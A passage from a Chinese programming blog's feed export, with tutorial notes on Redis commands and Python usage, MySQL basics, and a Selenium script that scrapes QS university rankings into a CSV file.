ret_dict[&quot;translateResult&quot;][0][0][&quot;tgt&quot;]        print(&quot;翻译的文本:&#123;&#125; 翻译后的结果:&#123;&#125;&quot;.format(self.word,ret))    # 操作方法    def run(self):        self.genrator_post()        ret_dict = self.send_request()        self.parser_response(ret_dict)if __name__ == &#x27;__main__&#x27;:    word = input(&quot;请输入要翻译的文本：&quot;)    yd = Youdao(word)    yd.run()</span></span><br></pre></td></tr></table></figure>





<h2 id="三、Scrapy框架分布式（reids）"><a href="#三、Scrapy框架分布式（reids）" class="headerlink" title="三、Scrapy框架分布式（reids）"></a>三、Scrapy框架分布式（reids）</h2><h3 id="a-reids-数据库"><a href="#a-reids-数据库" class="headerlink" title="a) reids 数据库"></a>a) reids 数据库</h3><p><img src="C:\Users\Administrator\Desktop\360截图20210608212329605.jpg" class="lazyload" data-srcset="C:\Users\Administrator\Desktop\360截图20210608212329605.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="360截图20210608212329605"> </p>
<p>1.redis安装和连接</p>
<p>reids:是一个数据库</p>
<p>2.数据库分为：</p>
<p>关系型数据库（数据在磁盘中存放）：mysql,sqlserver等   存放字段 id name</p>
<p>非关系型数据库（数据存放在内存中，提供了持久化保存的机制）:redis、mongodb等   存放的kv：key-value</p>
<p>3.redis安装:官网进行下载：redis.io</p>
<p>Redis官网是不支持windows的，只是开发一个msi格式安装文件</p>
<p>下载msi安装包:安装过程一路next,默认选择即可，需要添加到环境变量，设置内存的大小默认100M</p>
<p>4.启动redis</p>
<p>启动命令：redis-cli</p>
<p>5.键命令</p>
<p>0-15：redis默认有16个数据库，默认是在第0个数据库中</p>
<p>select num：切换数据库</p>
<p>keys * :所有键</p>
<p>6.五种数据类型：字符串（string）、哈希（字典）、列表（list）、集合（set）、有序集合（zset）</p>
<p>7.交互方式，三种 </p>
<p>7.1指令交互（cmd窗口化）</p>
<p>7.2客户端交互（可视化工具）</p>
<p>7.3代码交互（python操作redis）</p>
<h3 id="五种数据类型使用方式"><a href="#五种数据类型使用方式" class="headerlink" title="五种数据类型使用方式"></a>五种数据类型使用方式</h3><h4 id="字符串（string）："><a href="#字符串（string）：" class="headerlink" title="字符串（string）："></a>字符串（string）：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> key value: <span class="comment">#设置key-valueget key: #获取key所对应的valuegetrange key start end: #字符串的提取，字符串从0开始，包含start和endgetset key value :#设置key的值，返回的是旧值，新值会设置成功setex key seconds value: #设置key的值 过期时间为seconds  如果存在  则替换之，时间为s为单位setnx key value:#该key不存在的时候才设置，存在不设置strlen key :#得到该key对应的值的长度mset key value[key value]:#同时设置多个键值对mget :#一次获取多个键的值incr key：#为key对应的值增加1 如果key不存在那么先创建key，值为0，然后再设置为1decr key:#为key对应的值减1incrby key number ：#在指定的key对应的值加number</span></span><br></pre></td></tr></table></figure>

<h4 id="redis-在python中的运用"><a href="#redis-在python中的运用" class="headerlink" title="redis 在python中的运用"></a>redis 在python中的运用</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> redisres = redis.StrictRedis(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">6379</span>)<span class="comment"># sq = res.hkeys(&#x27;books&#x27;)## for i in sq:#     print(i.decode(&#x27;utf-8&#x27;))# print(res.hlen(&#x27;books&#x27;))# sq = (res.hmget(&#x27;books&#x27;,&#x27;僵尸管家2006&#x27;,&#x27;劫匪与僵尸&#x27;))# for i in sq:#     print(i.decode(&#x27;utf-8&#x27;))# sq = res.hgetall(&#x27;books&#x27;)# # print((sq.d).decode(&#x27;utf-8&#x27;))# print(res.hset(&#x27;books&#x27;,&#x27;劫匪与僵尸&#x27;).decode(&#x27;utf-8&#x27;))# sq = res.hvals(&#x27;books&#x27;)# for i in sq:#     print(i.decode(&#x27;utf-8&#x27;))# print(res.llen(&#x27;book&#x27;))# print(res.lindex(&#x27;book&#x27;,5).decode(&#x27;utf-8&#x27;))# sq = res.lrange(&#x27;book&#x27;,3,10)# for i in sq:#     print(i.decode(&#x27;utf-8&#x27;))#存：    red = redis.StrictRedis(&#x27;localhost&#x27;, 6379)    #哈希    red.hset(&#x27;安康&#x27;, str(item[&#x27;name&#x27;]), str(item))    #列表    red.lpush(&#x27;安康&#x27;,str(item))</span></span><br></pre></td></tr></table></figure>





<h4 id="哈希（hash）以字典的形式："><a href="#哈希（hash）以字典的形式：" class="headerlink" title="哈希（hash）以字典的形式："></a>哈希（hash）以字典的形式：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">增：<span class="number">1</span>、hmset key（名字） field1（键） value1（值） [field2 value2 ]  <span class="comment">#同时将多个 field-value (域-值)对设置到哈希表 key 中。2、hsetnx key field value  #只有在字段 field 不存在时，设置哈希表字段的值。3、hincrby key field increment #为哈希表 key 中的指定字段的整数值加上增量 increment删：1、hdel key field1 [field2] #删除一个或多个哈希表字段查：1、hexists key field #查看哈希表 key 中，指定的字段是否存在 存在返回TRUE 否则返回false。2、hget key field  #获取存储在哈希表中指定字段的值。3、hgetall key #获取在哈希表中指定key的所有字段和值，返回值为字典4、hkeys key  #获取所有哈希表中的 key字段， 所有键的值5、hlen key  #获取哈希表中字段的数量 键的数量6、hmget key field1 [field2]  #获取多个给定字段的值7、hset key field value   #将哈希表key中的字段field的值设为value 。8、hvals key   #获取哈希表中所有值。 返回值为列表9、hscan key cursor [MATCH pattern] [COUNT count] #迭代哈希表中的键值对。</span></span><br></pre></td></tr></table></figure>



<h4 id="列表（list）"><a href="#列表（list）" class="headerlink" title="列表（list）:"></a>列表（list）:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">增：<span class="number">1</span>、lpush key value1 [value2]  <span class="comment">#将一个或多个值插入到列表头部2、rpush key value1 [value2]  #在列表中添加一个或多个值3、rpushx key value  #为已存在的列表添加值4、lpushx key value  #将一个值插入到已存在的列表头部5、linsert key before|after pivot value  #在列表的元素前或者后插入元素删：1、blpop key1 [key2 ] timeout  #移出并获取列表的第一个元素， 如果列表没有元素会阻塞列表直到等待超时或发现可弹出元素为止。2、brpop key1 [key2 ] timeout  #移出并获取列表的最后一个元素， 如果列表没有元素会阻塞列表直到等待超时或发现可弹出元素为止。3、rpop key  #移除列表的最后一个元素，返回值为移除的元素。4、rpoplpush source destination  #移除列表的最后一个元素，并将该元素添加到另一个列表并返回5、lpop key  #移出并获取列表的第一个元素6、lrem key count value  #移除列表元素7、ltrim key start stop  #对一个列表进行修剪(trim)，就是说，让列表只保留指定区间内的元素，不在指定区间之内的元素都将被删除。查：1、lindex key index  #通过索引获取列表中的元素2、llen key  #获取列表长度3、lrange key start stop  #获取列表指定范围内的元素4、lset key index value  #通过索引设置列表元素的值5、brpoplpush source destination timeout  #从列表中弹出一个值，将弹出的元素插入到另外一个列表中并返回它； 如果列表没有元素会阻塞列表直到等待超时或发现可弹出元素为止。</span></span><br></pre></td></tr></table></figure>

<h4 id="集合（set）"><a href="#集合（set）" class="headerlink" title="集合（set）:"></a>集合（set）:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sadd key member1 [member2]  <span class="comment">#向集合添加一个或多个成员scard key  #获取集合的成员数sdiff key1 [key2]  #返回第一个集合与其他集合之间的差异。sdiffstore destination key1 [key2]  #返回给定所有集合的差集并存储在 destination 中sinter key1 [key2]  #返回给定所有集合的交集sinterstore destination key1 [key2]  #返回给定所有集合的交集并存储在 destination 中 sismember key member  #判断 member 元素是否是集合 key 的成员smembers key  #返回集合中的所有成员smove source destination member  #将 member 元素从 source 集合移动到 destination 集合spop key  # 移除并返回集合中的一个随机元素srandmember key [count]  #返回集合中一个或多个随机数srem key member1 [member2]   #移除集合中一个或多个成员sunion key1 [key2]   #返回所有给定集合的并集sunionstore destination key1 [key2]  #所有给定集合的并集存储在 destination 集合中sscan key cursor [MATCH pattern] [COUNT count]  #迭代集合中的元素</span></span><br></pre></td></tr></table></figure>

<h4 id="有序集合（zset）"><a href="#有序集合（zset）" class="headerlink" title="有序集合（zset）:"></a>有序集合（zset）:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">zadd key score1 member1 [score2 member2]  </span><br><span class="line"><span class="comment">#向有序集合添加一个或多个成员，或者更新已存在成员的分数zcard key  #获取有序集合的成员数zcount key min max  #计算在有序集合中指定区间分数的成员数zincrby  key increment member  #有序集合中对指定成员的分数加上增量 incrementzinterstore destination numkeys key [key ...]  #计算给定的一个或多个有序集的交集并将结果集存储在新的有序集合 destination 中zlexcount key min max  #在有序集合中计算指定字典区间内成员数量zrange key start stop [WITHSCORES]  #通过索引区间返回有序集合指定区间内的成员zrangebylex key min max [LIMIT offset count]  #通过字典区间返回有序集合的成员zrangebyscore key min max [WITHSCORES] [LIMIT] #通过分数返回有序集合指定区间内的成员zrank key member  #返回有序集合中指定成员的索引zrem key member [member ...]  #移除有序集合中的一个或多个成员zremrangebylex key min max  #移除有序集合中给定的字典区间的所有成员zremrangebyrank key start stop  #移除有序集合中给定的排名区间的所有成员zremrangebyscore key min max  #移除有序集合中给定的分数区间的所有成员zrevrange key start stop [WITHSCORES]  #返回有序集中指定区间内的成员，通过索引，分数从高到低zrevrangebyscore key max min [WITHSCORES]  #返回有序集中指定分数区间内的成员，分数从高到低排序zrevrank key member  #返回有序集合中指定成员的排名，有序集成员按分数值递减(从大到小)排序zscore key member  #返回有序集中，成员的分数值zunionstore destination numkeys key [key ...]  #计算给定的一个或多个有序集的并集，并存储在新的 key 中zscan key cursor [MATCH pattern] [COUNT count]  #迭代有序集合中的元素（包括元素成员和元素分值）</span></span><br></pre></td></tr></table></figure>









<h1 id="mysql讲解"><a href="#mysql讲解" class="headerlink" title="mysql讲解"></a>mysql讲解</h1><p>下载地址：<a href="https://dev.mysql.com/downloads/mysql/">https://dev.mysql.com/downloads/mysql/</a></p>
<h2 id="一、mysql的基本操作"><a href="#一、mysql的基本操作" class="headerlink" title="一、mysql的基本操作"></a>一、mysql的基本操作</h2><h3 id="1-开启mysql数据库服务"><a href="#1-开启mysql数据库服务" class="headerlink" title="1.开启mysql数据库服务"></a>1.开启mysql数据库服务</h3><p>格式：net start mysql(服务名)  – mysql57</p>
<h3 id="2-关闭mysql数据服务"><a href="#2-关闭mysql数据服务" class="headerlink" title="2.关闭mysql数据服务"></a>2.关闭mysql数据服务</h3><p>格式：net stop mysql(服务名)  – mysql57</p>
<h3 id="3-登录mysql"><a href="#3-登录mysql" class="headerlink" title="3.登录mysql"></a>3.登录mysql</h3><p>格式：mysql -u root -p  输入密码</p>
<h3 id="4-查看当前数据库版本信息"><a href="#4-查看当前数据库版本信息" class="headerlink" title="4.查看当前数据库版本信息"></a>4.查看当前数据库版本信息</h3><p>格式：select version()；</p>
<h3 id="5-查看当前的时间"><a href="#5-查看当前的时间" class="headerlink" title="5.查看当前的时间"></a>5.查看当前的时间</h3><p>格式： select now();</p>
<h3 id="6-退出"><a href="#6-退出" class="headerlink" title="6.退出"></a>6.退出</h3><p>quit,exit</p>
<h2 id="二-数据库的database的操作"><a href="#二-数据库的database的操作" class="headerlink" title="二.数据库的database的操作"></a>二.数据库的database的操作</h2><h3 id="1-查看当前有哪些数据库"><a href="#1-查看当前有哪些数据库" class="headerlink" title="1.查看当前有哪些数据库"></a>1.查看当前有哪些数据库</h3><p>格式:show databases;</p>
<h3 id="2-创建数据库"><a href="#2-创建数据库" class="headerlink" title="2.创建数据库"></a>2.创建数据库</h3><p>格式：create database 数据库名 charset=’utf8’</p>
<h3 id="3-使用数据库"><a href="#3-使用数据库" class="headerlink" title="3.使用数据库"></a>3.使用数据库</h3><p>格式：use 数据名称</p>
<h3 id="4-查看当前使用的数据库"><a href="#4-查看当前使用的数据库" class="headerlink" title="4.查看当前使用的数据库"></a>4.查看当前使用的数据库</h3><p>格式;select database()</p>
<h3 id="5-删除数据库"><a href="#5-删除数据库" class="headerlink" title="5.删除数据库"></a>5.删除数据库</h3><p>格式：drop database db</p>
<h2 id="三、表table的操作"><a href="#三、表table的操作" class="headerlink" title="三、表table的操作"></a>三、表table的操作</h2><h3 id="1-查看当前数据库有哪些表"><a href="#1-查看当前数据库有哪些表" class="headerlink" title="1.查看当前数据库有哪些表"></a>1.查看当前数据库有哪些表</h3><p>格式：show tables;</p>
<h3 id="2-创建一个表"><a href="#2-创建一个表" class="headerlink" title="2.创建一个表"></a>2.创建一个表</h3><p>格式：create table 表名(字段名 及类型)</p>
<p>auto_increment  ：自动增加</p>
<p>例:</p>
<p>create table student(</p>
<p>id int auto_increment primary key,<br>name varchar(20) not null,<br>age int not null,<br>address varchar(50),<br>gender bit default 1);</p>
<h3 id="3-查看表的结构"><a href="#3-查看表的结构" class="headerlink" title="3.查看表的结构"></a>3.查看表的结构</h3><p>格式：desc 表名</p>
<h3 id="4-查看创建表的语句"><a href="#4-查看创建表的语句" class="headerlink" title="4.查看创建表的语句"></a>4.查看创建表的语句</h3><p>格式：show create table 表名</p>
<h3 id="5-修改表"><a href="#5-修改表" class="headerlink" title="5.修改表"></a>5.修改表</h3><p>5.1 修改表的名字</p>
<p>格式：rename table 旧表名 to 新表名</p>
<p>5.2 修改表的结构  modify|add|drop|change</p>
<p>格式：modify 修改表字段类型</p>
<p>alter table 表名 modify  字段名 varchar(30)</p>
<p>格式：add 添加新的字段</p>
<p>alter table 表名 add 字段名 类型</p>
<p>格式：change 修改 表格里面的标题</p>
<p>alter table 表名 change 旧字段名 新字段名 新字段数据类型 </p>
<p>格式：drop 删除</p>
<p>alter table 表名 drop 字段名</p>
<h3 id="6-删除表"><a href="#6-删除表" class="headerlink" title="6.删除表"></a>6.删除表</h3><p>格式：drop table 表名</p>
<h2 id="四、数据的操作"><a href="#四、数据的操作" class="headerlink" title="四、数据的操作"></a>四、数据的操作</h2><h3 id="1-插入数据"><a href="#1-插入数据" class="headerlink" title="1.插入数据"></a>1.插入数据</h3><p>格式：insert into 表名 values(值1,值2…) </p>
<p>注意;顺序需要与表的结构对应，主键可以写为0</p>
<h3 id="2-缺省值插入"><a href="#2-缺省值插入" class="headerlink" title="2.缺省值插入"></a>2.缺省值插入</h3><p>格式：insert into 表名(字段名1，字段名2..)  values(值1，值2…)</p>
<h3 id="3-插入多条数据"><a href="#3-插入多条数据" class="headerlink" title="3.插入多条数据"></a>3.插入多条数据</h3><p>格式：insert into 表名 values(值1，值2..),(值1，值2…),(值1，值2…)</p>
<p>例：insert into student values(0,’赵六’,24,’叙利亚’,1),(0,’黑七’,25,’火星’,1)</p>
<h3 id="4-修改数据"><a href="#4-修改数据" class="headerlink" title="4.修改数据"></a>4.修改数据</h3><p>格式：update 表名 set 字段名1=值，字段名2=值…   where 条件  （注意只要满足条件都会改变）</p>
<h3 id="5-删除数据"><a href="#5-删除数据" class="headerlink" title="5.删除数据"></a>5.删除数据</h3><p>格式：delete from 表名 where 条件</p>
<h3 id="6-查询数据"><a href="#6-查询数据" class="headerlink" title="6.查询数据"></a>6.查询数据</h3><p>格式：</p>
<h4 id="6-1-查询所有"><a href="#6-1-查询所有" class="headerlink" title="6.1  查询所有"></a>6.1  查询所有</h4><p>格式：select * from 表名</p>
<h4 id="6-2-按条件查询"><a href="#6-2-按条件查询" class="headerlink" title="6.2 按条件查询"></a>6.2 按条件查询</h4><p>格式：select 字段名1,字段名2.. from 表名  where 条件</p>
<p>注意：6.2.1 select 后跟的是查询结果需要显示的字段名</p>
<p>​           6.2.2 *表示所有的字段名都要显示</p>
<p>​           6.2.3 from 后面跟的是表名 表示从那个表查询</p>
<p>​           6.2.4 where 后面跟的是筛选的条件</p>
<p>​           6.2.5 可以使用别名  字段名 as 别名 </p>
<p>条件中：运算</p>
<p>a） 比较运算符    &gt; 大于 &lt;小于    &gt;=    &lt;=    =    != 等</p>
<p>格式：select 字段名1，字段名2… from 表名 where 字段名 比较运算符 值</p>
<p>b)   逻辑运算符   and 且  or 或者 not 非</p>
<p>格式：select 字段名1，字段名2… from 表名 where 字段名 比较运算符 值 逻辑运算符  字段名 比较运算符 值</p>
<h4 id="6-3-模糊查询-like"><a href="#6-3-模糊查询-like" class="headerlink" title="6.3 模糊查询   like"></a>6.3 模糊查询   like</h4><p>% 表示多个任意字符</p>
<p>_ 表示一个任意字符</p>
<p>格式： select * from 表名 where 字段名 like 查询值</p>
<h4 id="6-4-范围查询"><a href="#6-4-范围查询" class="headerlink" title="6.4 范围查询"></a>6.4 范围查询</h4><p>in (多个值)  判断一个值是否在多个值中的一个</p>
<p>between 值1(包含) and 值2(包含)  判断一个值是否在 值1 和 值2之间</p>
<p>格式：select 字段名1，字段名2… from 表名 where 字段名 范围运算符 值</p>
<h4 id="7-空判断"><a href="#7-空判断" class="headerlink" title="7.空判断"></a>7.空判断</h4><p>is null 为空</p>
<p>is not null 不为空</p>
<p>格式：select 字段名1，字段名2… from 表名 where 字段名 is null</p>
<h4 id="8-优先级"><a href="#8-优先级" class="headerlink" title="8.优先级   ()"></a>8.优先级   ()</h4><h4 id="9-去重复的值"><a href="#9-去重复的值" class="headerlink" title="9.去重复的值"></a>9.去重复的值</h4><p>格式：select distinct  字段名 from 表名 where 条件</p>
<h4 id="10-聚合函数"><a href="#10-聚合函数" class="headerlink" title="10.聚合函数"></a>10.聚合函数</h4><p>count(*)  求当前结果的共有多少条数据</p>
<p>sum(字段名)  求列名对应的和</p>
<p>avg(字段名)  求列名对应的平均值</p>
<p>max(字段名)  求列名对应的最大值</p>
<p>min(字段名)  求列名对应的最小值</p>
<p>…</p>
<p>例子：求当前表总共有多少条数据？</p>
<p>select count(*) from student；</p>
<p>求年龄最小的值？</p>
<p>select min(age) from student;</p>
<h4 id="11-分组-group-by"><a href="#11-分组-group-by" class="headerlink" title="11.分组 group by"></a>11.分组 group by</h4><p>格式： select 字段名…. from 表名 where 条件 group by 字段名</p>
<p>例子：1.查看当前数据表的性别 </p>
<p>select gender from student group by gender</p>
<p>2.统计男生和女生各有多少个？</p>
<p>select gender,count(*) from student group by gender</p>
<p>3.统计所有女生的个数？  男生代表1  女生代表0</p>
<p>select gender as 性别,count(*) as 个数 from student where gender=0 group by gender </p>
<p>select gender as 性别,count(*) as 个数 from student group by gender having gender=0</p>
<p>where 查询条件  是对select 数据结果的查询条件</p>
<p>having 查询条件  是对group by分组后的结果加的查询条件</p>
<h4 id="12-排序-order-by"><a href="#12-排序-order-by" class="headerlink" title="12.排序   order by"></a>12.排序   order by</h4><p>升序：  从小到大   asc</p>
<p>降序： 从大到小    desc</p>
<p>格式：select * from 表名 order by 字段名 asc;</p>
<h4 id="13-分页"><a href="#13-分页" class="headerlink" title="13.分页"></a>13.分页</h4><p>格式： select 字段名… from 表名 where 条件 limit 起始值,多少条数据</p>
<p>起始值可以从0开始</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>reading</tag>
      </tags>
  </entry>
  <entry>
    <title>QS世界大学排名</title>
    <url>//QS%E4%B8%96%E7%95%8C%E5%A4%A7%E5%AD%A6%E6%8E%92%E5%90%8D</url>
    <content><![CDATA[<h1 id="QS世界大学排名"><a href="#QS世界大学排名" class="headerlink" title="QS世界大学排名"></a>QS世界大学排名</h1><p><a href="http://files.demo443.com/Markdown_file/%E4%B8%96%E7%95%8C%E5%A4%A7%E5%AD%A6%E6%8E%92%E5%90%8D.rar" target="_blank">file_rar</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Project University Ranking</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        In order to research for exchange information,studentsalways need to search for the university ranking from multiplesources.</span></span><br><span class="line"><span class="string">    I propose to make a web crawler to crawl top 200 universities from each sources.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Website:</span></span><br><span class="line"><span class="string">    QS ranking: https://www.topuniversities.com/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Data manipulation</span></span><br><span class="line"><span class="string">      1.Integrate all the data into one file</span></span><br><span class="line"><span class="string">      2.Data cleansing:</span></span><br><span class="line"><span class="string">        Organize all information from different website intounified format:</span></span><br><span class="line"><span class="string">            University Name</span></span><br><span class="line"><span class="string">            Ranking</span></span><br><span class="line"><span class="string">            Location(city&amp;country)</span></span><br><span class="line"><span class="string">            Source</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The crawled data for the website will be cleaned and submitted in csv format.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    程序调试环境：</span></span><br><span class="line"><span class="string">         Google Chrome：  版本 96.0.4664.45（正式版本） （64 位）</span></span><br><span class="line"><span class="string">           python解释器：  使用 anaconda3</span></span><br><span class="line"><span class="string">    chromedriver_win32：  96.0.4664.45/2021-11-16T09:35:54.118Z  测试时位于 anaconda3 根目录</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> fake_useragent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求方法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">driver, url</span>):</span></span><br><span class="line">    FileName = <span class="string">&#x27;./QS排名.csv&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(FileName, <span class="string">&quot;a&quot;</span>, newline=<span class="string">&#x27;&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="built_in">print</span>(FileName, <span class="string">&quot;   文件已创建...&quot;</span>)</span><br><span class="line">        fieldnames = [<span class="string">&quot;Rank&quot;</span>, <span class="string">&quot;University&quot;</span>, <span class="string">&quot;Overall Score&quot;</span>]</span><br><span class="line">        f_csv = csv.DictWriter(f, fieldnames=fieldnames)</span><br><span class="line">        f_csv.writeheader()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 开始请求</span></span><br><span class="line">        driver.get(url)</span><br><span class="line">        driver.implicitly_wait(<span class="number">10</span>)  <span class="comment"># 隐式等待时间 单位 秒/s  等待网页加载完成</span></span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">2</span>)  <span class="comment"># 网络原因 短暂停顿等待网页加载完成  网速好可删除此行</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 滑动浏览器滚动条向下滑动1000px</span></span><br><span class="line">        driver.execute_script(<span class="string">&quot;window.scrollTo(0,1000)&quot;</span>)  <span class="comment"># 执行JavaScript代码</span></span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>)  <span class="comment"># 网络原因 短暂停顿等待网页加载完成  网速好可删除此行</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:  <span class="comment"># 点击同意获取cookie</span></span><br><span class="line">            driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;popup-buttons&quot;]/button&#x27;</span>).click()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;已点击我同意获取cookie&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;没有点击...........................................&quot;</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计数标识</span></span><br><span class="line">        a = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 循环爬取3页数据</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):  <span class="comment"># 若开启递归  需把range(3) 改为0  或 去除此处循环</span></span><br><span class="line">            <span class="comment"># 下拉滚动条</span></span><br><span class="line">            driver.implicitly_wait(<span class="number">30</span>)  <span class="comment"># 隐式等待时间 单位 秒/s  等待网页加载完成</span></span><br><span class="line">            driver.execute_script(<span class="string">&quot;window.scrollTo(1000,2000)&quot;</span>)</span><br><span class="line">            time.sleep(<span class="number">2</span>)  <span class="comment"># 网络原因 短暂停顿等待网页加载完成  网速好可删除此行</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 点击下拉列表</span></span><br><span class="line">            driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;block-tu-d8-content&quot;]/div/article/div/div[3]&#x27;</span></span><br><span class="line">                                         <span class="string">&#x27;/div/div/div/div[3]/div[4]/div[1]/div[2]&#x27;</span>).click()</span><br><span class="line"></span><br><span class="line">            time.sleep(<span class="number">1</span>)  <span class="comment"># 网络原因 短暂停顿等待网页加载完成  网速好可删除此行</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 选择每页100条</span></span><br><span class="line">            driver.find_element_by_xpath(</span><br><span class="line">                <span class="string">&#x27;//*[@id=&quot;block-tu-d8-content&quot;]/div/article/div/div[3]/div/div/div/div[3]/div[4]/div[1]/div[2]/div[2]/div[4]&#x27;</span>).click()</span><br><span class="line"></span><br><span class="line">            driver.implicitly_wait(<span class="number">20</span>)  <span class="comment"># 隐式等待时间 单位 秒/s  等待网页加载完成</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)  <span class="comment"># 网络原因 短暂停顿等待网页加载完成  网速好可删除此行</span></span><br><span class="line">            driver.execute_script(<span class="string">&quot;window.scrollTo(0,document.body.scrollHeight-2000)&quot;</span>)</span><br><span class="line">            time.sleep(<span class="number">2</span>)  <span class="comment"># 网络原因 短暂停顿等待网页加载完成  网速好可删除此行</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># pagesource  开始解析页面内容</span></span><br><span class="line">            text = driver.page_source</span><br><span class="line">            html = etree.HTML(text)</span><br><span class="line"></span><br><span class="line">            content = html.xpath(<span class="string">&#x27;//*[@id=&quot;ranking-data-load&quot;]&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 每个页面100条  循环 依次获取数据</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">                Rank = content.xpath(<span class="string">&#x27;.//div[@class=&quot;row ind&quot;][&#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27;]/div/div/div/div[1]/div[1]/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                University = content.xpath(<span class="string">&#x27;.//div[@class=&quot;row ind&quot;][&#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27;]/div/div/div/div[2]/div/div[1]/a/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                Overall_Score = content.xpath(<span class="string">&#x27;.//div[@class=&quot;row ind&quot;][&#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27;]/div/div/div/div[3]/span[1]/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Rank：&quot;</span>, Rank)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;University：&quot;</span>, University)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Overall Score：&quot;</span>, Overall_Score)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;**********&#x27;</span>*<span class="number">10</span>)</span><br><span class="line">                a += <span class="number">1</span></span><br><span class="line">                f_csv.writerow(</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="string">&#x27;Rank&#x27;</span>: Rank,</span><br><span class="line">                        <span class="string">&#x27;University&#x27;</span>: University,</span><br><span class="line">                        <span class="string">&#x27;Overall Score&#x27;</span>: Overall_Score</span><br><span class="line">                    &#125;</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            <span class="comment"># js = &#x27;document.getElementById(&quot;password&quot;).click()&#x27;  # js点击元素</span></span><br><span class="line">            <span class="comment"># driver.execute_scrtip(js)  # 执行js语句</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 点击下一页</span></span><br><span class="line">            driver.find_element_by_css_selector(</span><br><span class="line">                <span class="string">&#x27;#alt-style-pagination &gt; li:nth-child(8) &gt; a&#x27;</span>).click()</span><br><span class="line">            time.sleep(<span class="number">1</span>)  <span class="comment"># 网络原因 短暂停顿等待网页加载完成  网速好可删除此行</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;已获取&#123;&#125;条数据！！！&#x27;</span>.<span class="built_in">format</span>(a))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;程序关闭！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！&quot;</span>)</span><br><span class="line">        driver.close()</span><br><span class="line">    <span class="comment"># 递归   不想用循环翻页可以打开此处递归</span></span><br><span class="line">    <span class="comment"># get(driver)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 